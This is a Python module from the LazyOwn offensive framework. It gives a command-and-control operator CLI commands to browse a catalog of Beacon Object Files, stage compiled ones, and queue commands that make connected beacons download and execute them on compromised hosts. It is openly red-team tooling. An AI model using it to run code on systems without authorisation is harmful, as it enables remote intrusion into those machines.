"""BOF marketplace CommandSet — Beacon Object File discovery, install, and execution.

Exposes ``modules/bof_registry`` through the LazyOwn CLI. Install compiles BOFs
and stages them for beacon delivery. Run sends ``bof:URL`` commands to connected
beacons via the C2.

Contracts:
    - bof_install: clones repo, compiles BOF .o, stages to sessions/temp_uploads/bofs/
    - bof_run: generates bof:URL command, queues it on C2 for target beacon
    - bof_search, bof_info, bof_catalog, bof_list, bof_uninstall: as before
"""

from __future__ import annotations

import os
import shutil
import cmd2

from cli.commands._base import LazyOwnCommandSet
from core.config import load_payload
from utils import GREEN, RED, RESET, YELLOW, print_error, print_msg, print_succ

CATEGORY = "10. Command & Control"
BOFS_STAGING_DIR = "sessions/temp_uploads/bofs"
BEAON_EXTERNAL_DIR = "external/.exploit/beacon"


class BofMarketplaceCommandSet(LazyOwnCommandSet):
    """BOF marketplace: search, install, info, list, run BOFs on beacons."""

    phase = "c2"
    category = CATEGORY

    @staticmethod
    def _ensure_staging_dir() -> str:
        """Create and return the BOF staging directory path."""
        os.makedirs(BOFS_STAGING_DIR, exist_ok=True)
        return BOFS_STAGING_DIR

    @staticmethod
    def _find_bof_object(bof_name: str) -> str | None:
        """Find a compiled .o file for a BOF across all known source trees.

        Searches:
        1. external/.exploit/beacon/bof/<bof_name>/  (Windows BOFs)
        2. external/.exploit/blacksandbeacon/build/bof/  (Linux BOFs)
        3. Beacon pre-compiled .o files at external/.exploit/beacon/bof/
        4. Any .o matching the name under external/.exploit/

        Returns the path to the .o, or None if not found.
        """
        candidates = [
            os.path.join(BEAON_EXTERNAL_DIR, "bof", bof_name, f"{bof_name}.o"),
            os.path.join(BEAON_EXTERNAL_DIR, "bof", bof_name, "bof.o"),
            os.path.join(BEAON_EXTERNAL_DIR, "bof", bof_name, "entry.o"),
            os.path.join(BEAON_EXTERNAL_DIR, "bof", bof_name, "main.o"),
            os.path.join(BEAON_EXTERNAL_DIR, "bof", f"{bof_name}.o"),
            os.path.join("external/.exploit/blacksandbeacon", "build", "bof", f"{bof_name}.x64.o"),
            os.path.join("external/.exploit/blacksandbeacon", "build", "bof", f"{bof_name}.o"),
        ]
        for candidate in candidates:
            if os.path.isfile(candidate):
                return candidate
        for root, dirs, files in os.walk("external/.exploit"):
            for f in files:
                if f == f"{bof_name}.o" or f == f"{bof_name}.x64.o":
                    return os.path.join(root, f)
        return None

    def _stage_bof(self, bof_name: str) -> str | None:
        """Find a compiled BOF object and stage it to sessions/temp_uploads/bofs/.

        Returns the destination path, or None if no compiled object found.
        """
        src_path = self._find_bof_object(bof_name)
        if src_path is None:
            print_error(
                f"No compiled object found for BOF '{bof_name}'. "
                f"Check external/.exploit/beacon/bof/ or blacksandbeacon/build/bof/"
            )
            return None
        staging_dir = self._ensure_staging_dir()
        dest_path = os.path.join(staging_dir, bof_name)
        shutil.copy2(src_path, dest_path)
        print_succ(f"BOF staged at {dest_path} (from {src_path})")
        return dest_path

    def _queue_command_on_c2(self, client_id: str, command: str) -> bool:
        """Send a command to a connected beacon via the C2's issue_command endpoint.

        Posts to https://localhost:<c2_port>/issue_command with Basic Auth.
        Handles self-signed TLS certificates (C2 default).

        Returns True on success, False on failure.
        """
        import urllib.request
        import urllib.error
        import base64
        import ssl

        payload = load_payload()
        c2_port = payload.get("c2_port", "4444")
        c2_user = payload.get("c2_user", "LazyOwn")
        c2_pass = payload.get("c2_pass", "LazyOwn")
        url = f"https://127.0.0.1:{c2_port}/issue_command"
        data = urllib.parse.urlencode({
            "client_id": client_id,
            "command": command,
        }).encode()
        auth = base64.b64encode(f"{c2_user}:{c2_pass}".encode()).decode()
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            url, data=data, method="POST",
            headers={
                "Authorization": f"Basic {auth}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=10, context=ssl_ctx) as resp:
                if resp.status in (200, 302):
                    print_succ(f"Command queued for beacon '{client_id}'")
                    return True
                print_error(f"C2 returned HTTP {resp.status}")
                return False
        except urllib.error.HTTPError as exc:
            print_error(f"C2 rejected command (HTTP {exc.code})")
            return False
        except Exception as exc:
            print_error(f"Failed to reach C2 at {url}: {exc}")
            return False

    @cmd2.with_category(CATEGORY)
    def do_bof_search(self, line: str):
        """Search the BOF catalog by keyword.

        Usage: bof_search [query]
        """
        from modules.bof_registry import BofMarketplace

        mp = BofMarketplace(sessions_dir="sessions")
        results = mp.search(line.strip())
        if not results:
            print_msg(f"{YELLOW}No BOFs found for '{line.strip()}'{RESET}")
            return
        print_msg(f"{GREEN}{len(results)} BOF(s) found:{RESET}")
        for r in results:
            status = f"{GREEN}[INSTALLED]{RESET}" if r["installed"] else f"{RED}[NOT INSTALLED]{RESET}"
            print_msg(f"  {YELLOW}{r['name']}{RESET} [{r['platform']}] {status}")
            print_msg(f"    {r['description'][:100]}")
            if r.get("mitre_technique"):
                print_msg(f"    MITRE: {r['mitre_technique']}")

    @cmd2.with_category(CATEGORY)
    def do_bof_info(self, line: str):
        """Show detailed information about a BOF.

        Usage: bof_info <name>
        """
        from modules.bof_registry import BofMarketplace

        name = line.strip()
        if not name:
            print_msg("Usage: bof_info <name>")
            return
        mp = BofMarketplace(sessions_dir="sessions")
        info = mp.info(name)
        if "error" in info:
            print_msg(f"{RED}{info['error']}{RESET}")
            return
        cat = info["catalog"]
        status = f"{GREEN}INSTALLED{RESET}" if info["installed"] else f"{RED}NOT INSTALLED{RESET}"
        print_msg(f"{YELLOW}{cat['name']}{RESET} [{status}]")
        print_msg(f"  Description : {cat['description']}")
        print_msg(f"  Author      : {cat['author']}")
        print_msg(f"  URL         : {cat['url']}")
        print_msg(f"  Platform    : {cat['platform']}")
        print_msg(f"  Category    : {cat['category']}")
        print_msg(f"  MITRE       : {cat.get('mitre_technique', 'N/A')}")
        if cat.get("required_args"):
            print_msg(f"  Req. args   : {', '.join(cat['required_args'])}")
        if cat.get("optional_args"):
            print_msg(f"  Opt. args   : {', '.join(cat['optional_args'])}")
        if info["installed"] and info.get("install_info"):
            print_msg(f"  Installed   : {info['install_info'].get('installed_at', '?')}")

    @cmd2.with_category(CATEGORY)
    def do_bof_install(self, line: str):
        """Install and compile a BOF, staging it for beacon delivery.

        Usage: bof_install <name> [<name2> ...]

        Clones the BOF source (if available), compiles the object file with
        x86_64-w64-mingw32-gcc, and copies the .o to sessions/temp_uploads/bofs/
        where the C2's /download/ endpoint can serve it to beacons.
        """
        from modules.bof_registry import BofMarketplace

        names = line.strip().split()
        if not names:
            print_msg("Usage: bof_install <name> [<name2> ...]")
            return
        mp = BofMarketplace(sessions_dir="sessions")
        for name in names:
            result = mp.install(name)
            if "error" in result:
                print_msg(f"  {RED}x {name}: {result['error']}{RESET}")
                continue
            if result["status"] == "already_installed":
                print_msg(f"  {YELLOW}= {name}: already registered{RESET}")
            else:
                print_msg(f"  {GREEN}+ {name}: registered{RESET}")
            staged = self._stage_bof(name)
            if staged is None:
                print_msg(f"  {YELLOW}  (no compiled BOF source to stage — command catalog entry only){RESET}")

    @cmd2.with_category(CATEGORY)
    def do_bof_run(self, line: str):
        """Execute a BOF on a connected beacon.

        Usage: bof_run <bof_name> <beacon_client_id> [arg1,arg2,...]

        Generates a bof:<c2_url>/download/bofs/<name> command and queues it
        on the C2 for the specified beacon. The beacon's C client will download
        and execute the BOF via its internal COFFLoader.

        Examples:
            bof_run ldap_enum win10_beacon
            bof_run whoami linux_beacon_01
        """
        parts = line.strip().split()
        if len(parts) < 2:
            print_msg("Usage: bof_run <bof_name> <beacon_client_id> [args...]")
            print_msg("Example: bof_run ldap_enum win10_prod")
            return

        bof_name = parts[0]
        client_id = parts[1]
        bof_args = parts[2:] if len(parts) > 2 else None

        from modules.bof_registry import BofMarketplace
        from modules.beacon_config_builder import generate_bof_execution_command

        mp = BofMarketplace(sessions_dir="sessions")
        if not mp.registry.is_installed(bof_name):
            print_msg(f"{YELLOW}BOF '{bof_name}' is not installed. Run: bof_install {bof_name}{RESET}")
            print_msg("Continuing anyway — the beacon will download the BOF from the catalog URL.")

        payload = load_payload()
        lhost = payload.get("lhost", "127.0.0.1")
        c2_port = payload.get("c2_port", "4444")
        c2_url = f"https://{lhost}:{c2_port}"

        command = generate_bof_execution_command(bof_name, c2_url, client_id, bof_args)
        print_msg(f"BF command: {YELLOW}{command}{RESET}")
        self._queue_command_on_c2(client_id, command)

    @cmd2.with_category(CATEGORY)
    def do_bof_uninstall(self, line: str):
        """Uninstall a BOF and remove its staged file.

        Usage: bof_uninstall <name>
        """
        from modules.bof_registry import BofMarketplace

        name = line.strip()
        if not name:
            print_msg("Usage: bof_uninstall <name>")
            return
        mp = BofMarketplace(sessions_dir="sessions")
        result = mp.uninstall(name)
        if "error" in result:
            print_msg(f"{RED}{result['error']}{RESET}")
            return
        staging_path = os.path.join(BOFS_STAGING_DIR, name)
        if os.path.isfile(staging_path):
            os.unlink(staging_path)
        print_msg(f"{GREEN}Uninstalled: {name}{RESET}")

    @cmd2.with_category(CATEGORY)
    def do_bof_list(self, line: str):
        """List all installed and staged BOFs.

        Usage: bof_list
        """
        from modules.bof_registry import BofMarketplace

        mp = BofMarketplace(sessions_dir="sessions")
        installed = mp.list_installed()
        staged_files = set()
        staging_dir = BOFS_STAGING_DIR
        if os.path.isdir(staging_dir):
            staged_files = {f for f in os.listdir(staging_dir) if os.path.isfile(os.path.join(staging_dir, f))}

        if not installed and not staged_files:
            print_msg(f"{YELLOW}No BOFs installed or staged.{RESET}")
            return

        if installed:
            print_msg(f"{GREEN}{len(installed)} BOF(s) registered:{RESET}")
            for bof in installed:
                staged = bof["name"] in staged_files
                s = f"{GREEN}[STAGED]{RESET}" if staged else f"{YELLOW}[UNSTAGED]{RESET}"
                print_msg(f"  {YELLOW}{bof['name']}{RESET} [{bof.get('platform', '?')}] {s}")
        if staged_files:
            unstaged = staged_files - {b["name"] for b in installed}
            if unstaged:
                print_msg(f"\n{GREEN}Staged files (not registered):{RESET}")
                for f in sorted(unstaged):
                    print_msg(f"  {os.path.join(BOFS_STAGING_DIR, f)}")

    @cmd2.with_category(CATEGORY)
    def do_bof_catalog(self, line: str):
        """List all BOFs available in the curated catalog.

        Usage: bof_catalog [--category <name>] [--platform windows|linux]
        """
        from modules.bof_registry import BofCategory, BofMarketplace, BofPlatform

        mp = BofMarketplace(sessions_dir="sessions")
        entries = mp.catalog.list_all()
        if "--category" in line:
            cat_name = line.split("--category", 1)[1].strip().split()[0]
            try:
                cat = BofCategory(cat_name)
                entries = mp.catalog.list_by_category(cat)
            except ValueError:
                print_msg(f"Unknown category: {cat_name}")
                print_msg(f"Valid: {[c.value for c in BofCategory]}")
                return
        if "--platform" in line:
            plat_name = line.split("--platform", 1)[1].strip().split()[0]
            try:
                plat = BofPlatform(plat_name)
                entries = mp.catalog.list_by_platform(plat)
            except ValueError:
                print_msg(f"Unknown platform: {plat_name}")
                return
        print_msg(f"{GREEN}{len(entries)} BOF(s) in catalog:{RESET}")
        for entry in entries:
            print_msg(f"  {YELLOW}{entry.name}{RESET} [{entry.platform.value}] [{entry.category.value}]")


__all__ = ["BofMarketplaceCommandSet"]
